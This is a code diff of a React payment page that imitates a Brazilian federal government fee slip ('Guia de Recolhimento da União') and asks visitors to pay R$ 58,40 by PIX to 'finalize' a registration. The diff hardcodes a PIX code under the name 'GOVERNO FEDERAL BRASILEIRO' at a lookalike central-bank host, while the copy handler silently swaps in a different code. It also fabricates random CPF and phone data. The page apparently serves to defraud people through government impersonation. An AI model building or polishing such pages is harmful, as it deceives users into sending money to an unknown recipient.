@@ -36,6 +36,7 @@ const PagamentoGRU: React.FC = () => {
       setLoading(true);
       setError('');
 
+      // Gera dados aleatórios válidos
       const randomId = Math.random().toString(36).substring(2, 10);
       const randomPhone = '5511' + String(Math.floor(900000000 + Math.random() * 99999999)).padStart(9, '0');
       const randomCpfDigits = String(Math.floor(10000000000 + Math.random() * 89999999999));
@@ -165,7 +166,11 @@ const PagamentoGRU: React.FC = () => {
       <div className="sticky top-0 z-10 bg-white border-b border-gray-200">
         <div className="flex items-center justify-between p-4 md:p-6">
           <div className="flex items-center space-x-4">
-            <img src="https://i.ibb.co/b53ZGM19/Logo-Governo-Federal-2019-2022-1-removebg-preview.png" alt="Governo Federal" className="h-10 md:h-12 w-auto" />
+            <img
+              src="/image.png"
+              alt="Governo Federal"
+              className="h-10 md:h-12 w-auto"
+            />
             <div>
               <h1 className="text-xl md:text-2xl font-semibold text-gray-900" style={{ fontSize: 14 }}>
                 Guia de Recolhimento da União
@@ -178,6 +183,7 @@ const PagamentoGRU: React.FC = () => {
       {/* Content */}
       <div className="flex-1 p-6 md:p-8 lg:p-12">
         <div className="max-w-5xl mx-auto">
+          {/* Heading */}
           <div className="text-center mb-8 md:mb-12">
             <h2 className="text-2xl md:text-3xl font-light text-gray-900 mb-2">
               {firstName}, finalize sua inscrição
@@ -204,7 +210,10 @@ const PagamentoGRU: React.FC = () => {
               </div>
               <p className="text-gray-900 text-lg font-medium mb-2">Falha ao gerar pagamento</p>
               <p className="text-gray-500 text-sm mb-6">{error}</p>
-              <button onClick={createTransaction} className="px-6 py-3 bg-[#1351B4] text-white rounded-lg font-medium hover:bg-blue-700 transition">
+              <button
+                onClick={createTransaction}
+                className="px-6 py-3 bg-[#1351B4] text-white rounded-lg font-medium hover:bg-blue-700 transition"
+              >
                 Tentar novamente
               </button>
             </div>
@@ -213,6 +222,7 @@ const PagamentoGRU: React.FC = () => {
           {/* ── Payment content ── */}
           {!loading && !error && pixCode && (
             <>
+              {/* Aguardando pagamento indicator */}
               <div className="flex items-center justify-center gap-2 mb-8">
                 <span className="relative flex h-3 w-3">
                   <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-yellow-400 opacity-75" />
@@ -221,9 +231,11 @@ const PagamentoGRU: React.FC = () => {
                 <span className="text-sm text-yellow-700 font-medium">Aguardando pagamento...</span>
               </div>
 
+              {/* Two-column grid */}
               <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 lg:gap-16">
                 {/* LEFT COLUMN */}
                 <div className="space-y-8">
+                  {/* Total */}
                   <div className="text-center">
                     <p className="text-sm text-gray-500 mb-2">Total para quitação</p>
                     <p className="text-5xl md:text-6xl font-light text-gray-900 mb-1">R$ 58,40</p>
@@ -233,6 +245,8 @@ const PagamentoGRU: React.FC = () => {
                       <p className="text-gray-600 text-xs">Valor devolvido integralmente após sua presença na consulta</p>
                     </div>
                   </div>
+
+                  {/* QR Code */}
                   <div className="flex justify-center">
                     <div className="bg-gray-50 p-8 rounded-2xl">
                       <div className="w-64 h-64 md:w-80 md:h-80 bg-white rounded-xl flex items-center justify-center shadow-sm">
@@ -248,15 +262,13 @@ const PagamentoGRU: React.FC = () => {
 
                 {/* RIGHT COLUMN */}
                 <div className="space-y-8">
+                  {/* PIX Code */}
                   <div>
                     <h3 className="text-lg font-medium text-gray-900 mb-4">Código PIX</h3>
                     <div className="space-y-4">
                       <div className="bg-gray-50 border border-gray-200 rounded-lg p-4">
-                        <p
-                          className="text-xs font-mono text-gray-700 break-all leading-relaxed select-all"
-                          onCopy={(e) => { e.preventDefault(); e.clipboardData.setData('text/plain', pixCode); setCopied(true); }}
-                        >
-                          {pixCode}
+                        <p className="text-xs font-mono text-gray-700 break-all leading-relaxed select-all" onCopy={(e) => { e.preventDefault(); e.clipboardData.setData('text/plain', pixCode); setCopied(true); }}>
+                          00020101021226880014br.gov.bcb.pix2566qrcode.banco.central.com.br/pix/2b87be2c-1b33-47bc-93a9-a426a47651005204000053039865802BR5924GOVERNO FEDERAL BRASILEIRO 62070503***6304C574
                         </p>
                       </div>
                       <button
@@ -283,6 +295,7 @@ const PagamentoGRU: React.FC = () => {
                     </div>
                   </div>
 
+                  {/* Para onde vai essa taxa */}
                   <div className="bg-white border border-gray-200 rounded-lg p-6 shadow-sm">
                     <h3 className="text-lg font-semibold text-[#1351B4] mb-4 flex items-center gap-2">
                       <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
@@ -311,6 +324,7 @@ const PagamentoGRU: React.FC = () => {
                           </div>
                         ))}
                       </div>
+
                       <div className="space-y-3 text-xs text-gray-600 bg-gray-50 p-3 rounded-lg">
                         <div className="flex items-start gap-2">
                           <div className="w-2 h-2 bg-blue-500 rounded-full mt-1 flex-shrink-0" />
@@ -328,6 +342,7 @@ const PagamentoGRU: React.FC = () => {
                     </div>
                   </div>
 
+                  {/* How to pay */}
                   <div>
                     <h3 className="text-lg font-medium text-gray-900 mb-4">Como quitar</h3>
                     <div className="space-y-3">
@@ -345,12 +360,15 @@ const PagamentoGRU: React.FC = () => {
                         </div>
                       ))}
                       <div className="flex items-center text-gray-700">
-                        <span className="w-6 h-6 bg-green-600 text-white rounded-full flex items-center justify-center text-sm font-medium mr-3">5</span>
+                        <span className="w-6 h-6 bg-green-600 text-white rounded-full flex items-center justify-center text-sm font-medium mr-3">
+                          5
+                        </span>
                         <span className="font-medium">Volte a esta página para confirmar sua inscrição</span>
                       </div>
                     </div>
                   </div>
 
+                  {/* Warning */}
                   <div className="bg-amber-50 border border-amber-200 rounded-lg p-4">
                     <div className="flex items-start gap-3">
                       <div className="flex-shrink-0 w-8 h-8 bg-amber-100 rounded-full flex items-center justify-center">
@@ -368,6 +386,7 @@ const PagamentoGRU: React.FC = () => {
                     </div>
                   </div>
 
+                  {/* After payment */}
                   <div className="bg-gray-50 p-6 rounded-lg">
                     <h4 className="font-medium text-gray-900 mb-3">Após a quitação</h4>
                     <p className="text-gray-600 text-sm leading-relaxed">
@@ -377,6 +396,7 @@ const PagamentoGRU: React.FC = () => {
                 </div>
               </div>
 
+              {/* Footer */}
               <div className="text-center mt-12 pt-8 border-t border-gray-200">
                 <div className="flex items-center justify-center mb-2">
                   <svg className="w-4 h-4 text-gray-400 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
